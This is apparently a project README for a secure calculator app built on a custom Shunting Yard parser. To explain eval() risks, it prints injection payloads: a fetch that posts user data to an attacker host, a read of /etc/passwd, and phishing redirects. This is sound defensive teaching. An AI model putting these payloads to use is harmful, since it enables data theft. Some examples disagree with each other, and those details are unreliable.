# Math Calculator - Full Stack Application

A secure, full-stack math calculator application featuring a React frontend and Node.js backend that communicate via HTTPS REST API with API key authentication and SSL/TLS encryption. This project demonstrates modern web development practices, secure API communication, and comprehensive mathematical expression parsing.

## 📋 Project Overview

This application fulfills User Story 1 requirements by providing:

- **Frontend**: Modern React web interface for mathematical calculations
- **Backend**: Secure Node.js/Express API server with authentication
- **Communication**: HTTPS REST API calls between client and server
- **Security**: API key authentication for all requests
- **Validation**: Comprehensive input validation and error handling

### Key Features

✅ **Mathematical Operations**: Addition (+), Subtraction (-), Multiplication (*), Division (/)  
✅ **Operator Precedence**: *, / have higher precedence over +, -  
✅ **Parentheses Support**: Override operator precedence with parentheses  
✅ **API Key Authentication**: Secure endpoint access  
✅ **Real-time Validation**: Input validation with user-friendly error messages  
✅ **Calculation History**: Local storage of previous calculations  
✅ **Responsive Design**: Modern UI with TailwindCSS  
✅ **Comprehensive Testing**: Extensive positive and negative test cases  

## 🛠 Technology Stack

### Frontend
- **Framework**: React 19.1.1
- **Build Tool**: Vite 7.1.2
- **Styling**: TailwindCSS 3.4.17
- **HTTP Client**: Axios 1.11.0
- **Icons**: Lucide React
- **Utilities**: clsx, tailwind-merge

### Backend
- **Runtime**: Node.js (≥14.0.0)
- **Framework**: Express.js 4.18.2
- **Security**: Helmet 7.1.0
- **CORS**: cors 2.8.5
- **Rate Limiting**: express-rate-limit 7.1.5
- **Environment**: dotenv 16.6.1

## 📁 Project Structure

```
gb-userstory1/
├── README.md                 # This file
├── .gitignore               # Git ignore rules (includes *.pem, .env)
├── certs/                   # SSL certificates (local development)
│   ├── localhost.pem        # SSL certificate (git-ignored)
│   └── localhost-key.pem    # Private key (git-ignored)
├── frontend/                # React frontend application
│   ├── .env                 # Frontend environment variables (git-ignored)
│   ├── src/
│   │   ├── components/
│   │   │   └── Calculator.jsx    # Main calculator component
│   │   ├── config/
│   │   │   └── https.config.js   # HTTPS fallback configuration
│   │   ├── services/
│   │   │   └── api.js           # API service and utilities
│   │   ├── utils/
│   │   │   └── index.js         # Utility functions
│   │   ├── App.jsx              # Main app component
│   │   ├── main.jsx             # Application entry point
│   │   └── index.css            # Global styles
│   ├── package.json
│   └── vite.config.js       # Vite configuration with HTTPS setup
└── backend/                 # Node.js backend server
    ├── .env                 # Backend environment variables (git-ignored)
    ├── middleware/
    │   ├── auth.js          # API key authentication
    │   ├── logging.js       # Request logging
    │   ├── rateLimit.js     # Rate limiting
    │   └── validation.js    # Input validation
    ├── routes/
    │   ├── api.js          # Calculation endpoints
    │   └── index.js        # Route management
    ├── utils/
    │   └── mathParser.js   # Mathematical expression parser
    ├── config.js           # Configuration management
    ├── https.config.js     # HTTPS fallback configuration  
    ├── server.js           # Main HTTPS server file
    ├── test.js             # Comprehensive test suite
    └── package.json
```

## 🧮 Mathematical Expression Parser

### Overview

The core of this calculator application is a custom-built mathematical expression parser that implements the **Shunting Yard algorithm**. This parser is responsible for correctly interpreting and evaluating mathematical expressions while respecting operator precedence and parentheses.

### Why a Custom Parser?

Instead of using JavaScript's `eval()` function (which poses serious security risks) or external math libraries, we implemented a custom parser that:

- ✅ **Secure**: No code execution vulnerabilities
- ✅ **Controlled**: Only supports specific mathematical operations
- ✅ **Predictable**: Follows standard mathematical precedence rules
- ✅ **Robust**: Comprehensive error handling and validation
- ✅ **Educational**: Demonstrates computer science algorithms in practice

### 🚨 Why `eval()` is Dangerous

The `eval()` function is one of the most dangerous features in JavaScript and should **never** be used for processing user input. Here's why:

#### 1. **Arbitrary Code Execution**
`eval()` executes **any JavaScript code** passed to it, not just mathematical expressions:

```javascript
// DANGEROUS: eval() executes arbitrary code
eval("2 + 3 * 4");           // ✅ Safe: Returns 14
eval("alert('Hacked!')");     // ❌ Dangerous: Shows alert
eval("document.body.innerHTML = '<h1>Hacked!</h1>'"); // ❌ DOM manipulation!
eval("fetch('https://malicious-site.com/steal-data')"); // ❌ Data theft!
```

#### 2. **Code Injection Attacks**
If user input reaches `eval()`, attackers can inject malicious code:

```javascript
// VULNERABLE CODE (NEVER DO THIS!)
function calculate(expression) {
    return eval(expression); // ❌ Extremely dangerous!
}

// Attack scenarios:
calculate("2 + 3");                    // ✅ Looks innocent
calculate("alert('XSS Attack!')");     // ❌ Executes arbitrary code
calculate("localStorage.clear()");     // ❌ Could destroy user data
calculate("location.href='https://malicious-site.com'"); // ❌ Redirects user
```

#### 3. **Access to Global Scope**
`eval()` has access to the entire JavaScript execution context:

```javascript
// eval() can access/modify global variables and functions
let secretApiKey = "abc123";
eval("console.log(secretApiKey)"); // ❌ Could expose secrets
eval("secretApiKey = 'stolen'");   // ❌ Could modify sensitive data
eval("fetch('/api/admin/users')"); // ❌ Could access restricted APIs
```

#### 4. **No Input Validation**
`eval()` doesn't distinguish between safe mathematical expressions and dangerous code:

```javascript
// These all execute with eval():
eval("2 + 3");                    // ✅ Math
eval("process.exit()");           // ❌ Could crash server
eval("require('fs').readFileSync('/etc/passwd')"); // ❌ Could read system files
eval("window.open('https://malware-site.com')");   // ❌ Could open malicious sites
```

#### 5. **Real-World Attack Examples**

**Example 1: Calculator Hijacking**
```javascript
// User enters: "Math.random() < 0.5 ? 42 : location.href='https://phishing-site.com'"
// Result: 50% chance of redirecting to malicious site
```

**Example 2: Data Exfiltration**
```javascript
// User enters: "fetch('/api/user-data').then(r=>r.json()).then(d=>fetch('https://attacker.com',{method:'POST',body:JSON.stringify(d)}))"
// Result: Steals user data and sends to attacker's server
```

**Example 3: Session Hijacking**
```javascript
// User enters: "document.cookie = 'sessionId=hacked; path=/'"
// Result: Could compromise user session
```

### 🛡️ How Our Custom Parser Prevents These Attacks

#### 1. **Whitelist-Only Approach**
Our parser only allows specific, safe characters:

```javascript
// Only these characters are allowed:
const allowedPattern = /^[\d+\-*/().\s]+$/;
// ✅ Digits: 0-9
// ✅ Operators: +, -, *, /
// ✅ Parentheses: (, )
// ✅ Decimal point: .
// ✅ Whitespace: space, tab, newline
// ❌ Everything else is rejected
```

#### 2. **No Code Execution**
The parser only processes mathematical tokens:

```javascript
// Our parser processes this:
"2 + 3 * 4" → [2, '+', 3, '*', 4] → [2, 3, 4, '*', '+'] → 14

// It CANNOT execute these attacks:
"alert('hack')" → ❌ Error: "Invalid character: a"
"fetch('/api')" → ❌ Error: "Invalid character: f"
"document.body" → ❌ Error: "Invalid character: d"
```

#### 3. **Controlled Operations**
Only predefined mathematical operations are supported:

```javascript
// ✅ Supported and safe:
this.operators = {
  '+': { precedence: 1, associativity: 'left' },
  '-': { precedence: 1, associativity: 'left' },
  '*': { precedence: 2, associativity: 'left' },
  '/': { precedence: 2, associativity: 'left' }
};

// ❌ NOT supported (cannot be injected):
// - Function calls (alert, fetch, etc.)
// - Variable access (document, window, etc.)
// - File system operations
// - Network requests
// - DOM manipulation
// - Cookie/localStorage access
```

#### 4. **Security Comparison**

| Method | Security Level | Input Validation | Code Execution Risk | Recommendation |
|--------|---------------|------------------|-------------------|----------------|
| `eval()` | ❌ None | ❌ None | 🚨 **Extremely High** | **Never use** |
| `Function()` | ❌ None | ❌ None | 🚨 **Extremely High** | **Never use** |
| Our Custom Parser | ✅ **Maximum** | ✅ **Comprehensive** | 🟢 **Zero** | ✅ **Recommended** |
| Math Libraries | ✅ High | ✅ Good | 🟢 **Very Low** | ✅ Good alternative |

#### 5. **Attack Prevention Examples**

```javascript
const parser = new MathParser();

// ✅ Safe mathematical expressions work perfectly:
parser.calculate("2 + 3 * 4");        // Returns: 14
parser.calculate("(10 + 5) / 3");     // Returns: 5
parser.calculate("100 - 25 * 2");     // Returns: 50

// ❌ All attack attempts are blocked:
parser.calculate("alert('hack')");     // Error: "Invalid character: a"
parser.calculate("fetch('/api')");     // Error: "Invalid character: f"
parser.calculate("document.write");    // Error: "Invalid character: d"
parser.calculate("window.location");   // Error: "Invalid character: w"
parser.calculate("eval('malicious')"); // Error: "Invalid character: e"
parser.calculate("setTimeout(fn,0)");  // Error: "Invalid character: s"
```

This implementation ensures that **no malicious code can ever be executed**, making our calculator application completely secure against code injection attacks while maintaining full mathematical functionality.

### The Shunting Yard Algorithm

The **Shunting Yard algorithm**, invented by Dutch computer scientist Edsger Dijkstra in 1961, is a method for parsing mathematical expressions specified in infix notation and converting them to postfix notation (also known as Reverse Polish Notation or RPN).

#### Why Shunting Yard?

1. **Operator Precedence**: Automatically handles mathematical precedence rules (*, / before +, -)
2. **Parentheses Support**: Correctly processes nested parentheses
3. **Efficiency**: Linear time complexity O(n)
4. **Reliability**: Well-established algorithm used in calculators and compilers
5. **Clarity**: Clean separation between parsing and evaluation phases

#### Algorithm Process

The algorithm uses two main data structures:
- **Output Queue**: Stores the final postfix expression
- **Operator Stack**: Temporarily holds operators and parentheses

#### Step-by-Step Example

Let's trace through the expression: `2 + 3 * 4`

**Input (Infix)**: `2 + 3 * 4`
**Expected Output (Postfix)**: `2 3 4 * +`
**Final Result**: `14`

| Step | Token | Action | Output Queue | Operator Stack | Notes |
|------|-------|--------|--------------|----------------|-------|
| 1 | `2` | Number → Output | `[2]` | `[]` | Numbers go directly to output |
| 2 | `+` | Operator → Stack | `[2]` | `[+]` | First operator goes to stack |
| 3 | `3` | Number → Output | `[2, 3]` | `[+]` | Numbers go directly to output |
| 4 | `*` | Operator → Stack | `[2, 3]` | `[+, *]` | * has higher precedence than +, so stack |
| 5 | `4` | Number → Output | `[2, 3, 4]` | `[+, *]` | Numbers go directly to output |
| 6 | End | Pop all operators | `[2, 3, 4, *, +]` | `[]` | Pop operators in reverse order |

**Evaluation of Postfix**: `2 3 4 * +`
1. Push `2` → Stack: `[2]`
2. Push `3` → Stack: `[2, 3]`
3. Push `4` → Stack: `[2, 3, 4]`
4. Operator `*` → Pop `4` and `3`, compute `3 * 4 = 12`, push result → Stack: `[2, 12]`
5. Operator `+` → Pop `12` and `2`, compute `2 + 12 = 14`, push result → Stack: `[14]`
6. **Final Result**: `14`

#### Implementation Architecture

Our `MathParser` class implements the Shunting Yard algorithm in three main phases:

```javascript
// 1. TOKENIZATION: "2 + 3 * 4" → [2, '+', 3, '*', 4]
const tokens = this.tokenize(expression);

// 2. INFIX TO POSTFIX: [2, '+', 3, '*', 4] → [2, 3, 4, '*', '+']
const postfix = this.infixToPostfix(tokens);

// 3. EVALUATION: [2, 3, 4, '*', '+'] → 14
const result = this.evaluatePostfix(postfix);
```

### Technical Implementation Details

#### 1. Operator Configuration
```javascript
this.operators = {
  '+': { precedence: 1, associativity: 'left' },
  '-': { precedence: 1, associativity: 'left' },
  '*': { precedence: 2, associativity: 'left' },
  '/': { precedence: 2, associativity: 'left' }
};
```

#### 2. Expression Validation
- **Character Validation**: Only allows digits, operators, parentheses, decimal points, and whitespace
- **Number Format Validation**: Prevents multiple decimal points (`2..3`)
- **Structure Validation**: Ensures proper operator/operand arrangement

#### 3. Tokenization Process
- Parses character by character
- Handles decimal numbers correctly
- Validates number formats in real-time
- Separates numbers, operators, and parentheses

#### 4. Precedence Handling
The algorithm correctly handles operator precedence:
- **High Precedence (2)**: `*`, `/`
- **Low Precedence (1)**: `+`, `-`
- **Parentheses**: Override any precedence

#### 5. Error Handling
The parser provides specific error messages for common issues:

| Error Type | Example | Error Message |
|------------|---------|---------------|
| Division by Zero | `5 / 0` | "Division by zero is not allowed" |
| Invalid Characters | `2 & 3` | "Invalid character: &" |
| Mismatched Parentheses | `(2 + 3` | "Mismatched parentheses" |
| Invalid Number Format | `2..5` | "Invalid number format: 2..5" |
| Empty Expression | ` ` | "Expression cannot be empty" |
| Insufficient Operands | `+ 3` | "Invalid expression: insufficient operands" |

### Performance Characteristics

- **Time Complexity**: O(n) where n is the length of the expression
- **Space Complexity**: O(n) for the output queue and operator stack
- **Memory Efficient**: No recursive calls, uses iterative approach
- **Predictable**: Same expression always produces same result

### Algorithm Advantages

1. **Mathematical Accuracy**: Follows standard mathematical precedence
2. **Security**: No arbitrary code execution
3. **Extensibility**: Easy to add new operators or functions
4. **Debugging**: Clear separation between parsing and evaluation
5. **Testing**: Each phase can be tested independently

### Real-World Applications

The Shunting Yard algorithm is used in:
- 🖩 **Calculators**: Desktop and mobile calculator applications
- 💻 **Compilers**: Programming language expression parsing
- 📊 **Spreadsheets**: Formula evaluation in Excel, Google Sheets
- 🎮 **Game Engines**: Mathematical expression systems
- 🤖 **Programming Languages**: Expression evaluation engines

### Example Calculations

| Expression | Tokens | Postfix | Result | Notes |
|------------|--------|---------|--------|-------|
| `2 + 3` | `[2, '+', 3]` | `[2, 3, '+']` | `5` | Simple addition |
| `2 * 3 + 4` | `[2, '*', 3, '+', 4]` | `[2, 3, '*', 4, '+']` | `10` | Multiplication first |
| `(2 + 3) * 4` | `[2, '+', 3, '*', 4]` | `[2, 3, '+', 4, '*']` | `20` | Parentheses override |
| `10 / 2 - 1` | `[10, '/', 2, '-', 1]` | `[10, 2, '/', 1, '-']` | `4` | Left-to-right evaluation |

This implementation ensures that mathematical expressions are evaluated correctly, securely, and efficiently, providing a solid foundation for the calculator application.

## 🚀 Quick Start

### Prerequisites

- Node.js (v14 or higher)
- npm or yarn
- Git

### Installation & Setup

1. **Clone the repository**:
   ```bash
   git clone <repository-url>
   cd gb-userstory1
   ```

2. **Backend Setup**:
   ```bash
   cd backend
   npm install
   npm start
   ```
   The backend server will start on `https://localhost:3001`

3. **Frontend Setup** (in a new terminal):
   ```bash
   cd frontend
   npm install
   npm run dev
   ```
   The frontend will be available at `https://localhost:5173`

## 🔒 HTTPS Setup & SSL Certificates

This application uses **HTTPS for secure local development** with locally-trusted SSL certificates generated by `mkcert`.

### Prerequisites for HTTPS

1. **Install mkcert** (creates locally-trusted development certificates):
   ```bash
   # macOS (using Homebrew)
   brew install mkcert
   
   # Ubuntu/Debian
   sudo apt install libnss3-tools
   wget -O mkcert https://github.com/FiloSottile/mkcert/releases/latest/download/mkcert-v*-linux-amd64
   chmod +x mkcert
   sudo mv mkcert /usr/local/bin/
   
   # Windows (using Chocolatey)
   choco install mkcert
   ```

2. **Install mkcert root CA**:
   ```bash
   mkcert -install
   ```
   This installs the mkcert Certificate Authority in your system's trust store.

### SSL Certificate Generation

1. **Create certificates directory**:
   ```bash
   mkdir -p certs
   ```

2. **Generate SSL certificates**:
   ```bash
   mkcert -key-file certs/localhost-key.pem -cert-file certs/localhost.pem localhost 127.0.0.1 ::1
   ```

This creates:
- `certs/localhost.pem` - SSL certificate file
- `certs/localhost-key.pem` - Private key file (⚠️ Keep secure)

### Environment Configuration

Create `.env` files in both frontend and backend directories:

**Backend `.env`** (`backend/.env`):
```env
# Backend Environment Configuration
PORT=3001
NODE_ENV=development
API_KEY=math-calculator-api-key
```

**Frontend `.env`** (`frontend/.env`):
```env
# Frontend Environment Configuration
VITE_API_BASE_URL=https://localhost:3001
VITE_API_KEY=math-calculator-api-key
```

### 🔐 SSL Certificate Security

- **✅ Locally-trusted**: No browser security warnings
- **🔒 Development-only**: These certificates are for local development
- **📁 Gitignored**: Certificate files are excluded from version control
- **⏰ Auto-expires**: mkcert certificates expire automatically (typically 2-3 years)
- **🔄 Regeneratable**: Can be recreated anytime with the same mkcert commands

### Why HTTPS for Local Development?

1. **🛡️ Security Best Practice**: Matches production environment
2. **🔒 Encrypted Communication**: Protects API keys and data in transit
3. **📱 PWA Compatibility**: Required for Progressive Web App features
4. **🌐 Modern Web APIs**: Many browser APIs require HTTPS
5. **🎯 Testing Realism**: Tests under production-like conditions

### Available Scripts

#### Backend
- `npm start` - Start production server
- `npm run dev` - Start development server with nodemon
- `npm test` - Run comprehensive test suite

#### Frontend
- `npm run dev` - Start development server
- `npm run build` - Build for production
- `npm run preview` - Preview production build
- `npm run lint` - Run ESLint

## 🔐 API Authentication

All API requests require authentication via API key in the request headers:

```javascript
Headers: {
  "X-API-Key": "math-calculator-api-key"
  // or alternatively:
  // "Authorization": "math-calculator-api-key"
}
```

## 📡 API Endpoints

### Calculate Expression

```https
POST https://localhost:3001/api/v1/calculate
Content-Type: application/json
X-API-Key: math-calculator-api-key

{
  "expression": "2 + 3 * 4"
}
```

#### Success Response
```json
{
  "success": true,
  "expression": "2 + 3 * 4",
  "result": 14,
  "timestamp": "2024-01-01T12:00:00.000Z"
}
```

#### Error Response
```json
{
  "success": false,
  "error": "Division by zero is not allowed",
  "code": "DIVISION_BY_ZERO",
  "expression": "5 / 0"
}
```

## 🧪 Test Cases

### Positive Test Cases ✅

| Test Case | Expression | Expected Result | Description |
|-----------|------------|-----------------|-------------|
| 1 | `2 + 3` | `5` | Simple addition |
| 2 | `10 - 4` | `6` | Simple subtraction |
| 3 | `3 * 4` | `12` | Simple multiplication |
| 4 | `15 / 3` | `5` | Simple division |
| 5 | `2 + 3 * 4` | `14` | Operator precedence (multiplication first) |
| 6 | `(2 + 3) * 4` | `20` | Parentheses override precedence |
| 7 | `10 / 2 + 3` | `8` | Division before addition |
| 8 | `2.5 + 1.5` | `4` | Decimal numbers |
| 9 | `100 - 50 + 25` | `75` | Multiple operations (left to right) |
| 10 | `2 * 3 + 4 * 5` | `26` | Multiple multiplication operations |

### Negative Test Cases ❌

| Test Case | Expression | Expected Behavior | Description |
|-----------|------------|-------------------|-------------|
| 1 | `5 / 0` | Error: "Division by zero is not allowed" | Division by zero |
| 2 | `2 +` | Error: "Invalid expression" | Incomplete expression |
| 3 | `+ 3` | Error: "Invalid expression" | Expression starting with operator |
| 4 | `(2 + 3` | Error: "Mismatched parentheses" | Unclosed parenthesis |
| 5 | `2 + 3)` | Error: "Mismatched parentheses" | Extra closing parenthesis |
| 6 | `2 ** 3` | Error: "Invalid character" | Unsupported operator |
| 7 | `2 & 3` | Error: "Invalid character" | Invalid character |
| 8 | `` | Error: "Expression cannot be empty" | Empty expression |
| 9 | `   ` | Error: "Expression cannot be empty" | Whitespace only |
| 10 | `2..5 + 3` | Error: "Invalid character" | Invalid number format |

### API Authentication Test Cases 🔑

| Test Case | Scenario | Expected Result |
|-----------|----------|-----------------|
| 1 | Valid API key | 200 OK with calculation result |
| 2 | Missing API key | 401 Unauthorized |
| 3 | Invalid API key | 401 Unauthorized |
| 4 | Malformed API key | 401 Unauthorized |

## 🏃‍♂️ Running Tests

### Backend Tests
```bash
cd backend
npm test
```

This will run all test cases and display results:
- ✅ Positive test cases (mathematical operations)
- ❌ Negative test cases (error handling)
- 🔑 API authentication tests

### Manual Frontend Testing
1. Open the calculator at `https://localhost:5173`
2. Try the test expressions listed above
3. Verify error handling for invalid inputs
4. Test the calculation history feature

## 🔧 Configuration

### Environment Variables

Both frontend and backend use `.env` files for configuration:

#### Backend Configuration (`backend/.env`)
```env
# Server Configuration
PORT=3001                           # HTTPS server port
NODE_ENV=development                 # Environment mode (development/production)

# Security
API_KEY=math-calculator-api-key     # API authentication key
```

#### Frontend Configuration (`frontend/.env`)
```env
# API Configuration  
VITE_API_BASE_URL=https://localhost:3001    # Backend HTTPS URL
VITE_API_KEY=math-calculator-api-key        # API authentication key
```

### Configuration Priority

1. **Environment variables** (`.env` files) - **Highest Priority**
2. **Fallback configurations** (`https.config.js` files) - Used if `.env` is missing

### SSL Certificate Configuration

Both frontend and backend automatically use SSL certificates from:
- **Certificate**: `certs/localhost.pem`
- **Private Key**: `certs/localhost-key.pem`

These paths are configured in:
- **Frontend**: `vite.config.js` (Vite HTTPS server)
- **Backend**: `server.js` (Express HTTPS server)

## 🛡 Security Features

1. **🔒 HTTPS/TLS Encryption**: End-to-end encryption for all communications
2. **🔑 API Key Authentication**: All endpoints protected with API key validation  
3. **🛡️ SSL Certificates**: Locally-trusted development certificates via mkcert
4. **✅ Input Validation**: Comprehensive sanitization and validation of mathematical expressions
5. **⏱️ Rate Limiting**: Configurable request rate limiting to prevent abuse
6. **🌐 CORS Configuration**: Controlled cross-origin resource sharing
7. **🔐 Security Headers**: Helmet.js provides additional security headers
8. **❌ Error Handling**: Prevents information leakage through detailed error messages

## 🌟 Additional Features

### Frontend
- **Real-time Validation**: Input validation with immediate feedback
- **Calculation History**: Stores up to 50 previous calculations in localStorage
- **Copy to Clipboard**: Easy copying of calculation results
- **Responsive Design**: Mobile-first approach with TailwindCSS
- **Accessibility**: ARIA labels, keyboard navigation, screen reader support
- **Loading States**: Visual feedback during API calls
- **Offline Detection**: Shows connection status

### Backend
- **Mathematical Parser**: Custom implementation using Shunting Yard algorithm (see [Mathematical Expression Parser](#-mathematical-expression-parser) section for detailed explanation)
- **Comprehensive Logging**: Request logging middleware
- **Error Categories**: Detailed error codes for different failure types
- **Rate Limiting**: Configurable request throttling
- **Health Monitoring**: Server status and connection monitoring

## 📈 Performance Considerations

- **Frontend**: Optimized bundle size with Vite, lazy loading, and efficient React patterns
- **Backend**: Lightweight Express server with minimal dependencies
- **API**: Efficient mathematical parsing with proper error handling
- **Caching**: Browser caching for static assets and calculation history

## 🌐 Browser Support

- Chrome 90+
- Firefox 88+
- Safari 14+
- Edge 90+

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the package.json files for details.

## 👨‍💻 Author

**Amirul Ismail**

---

**Note**: This project demonstrates full-stack development best practices including secure API communication, proper error handling, comprehensive testing, and modern web technologies.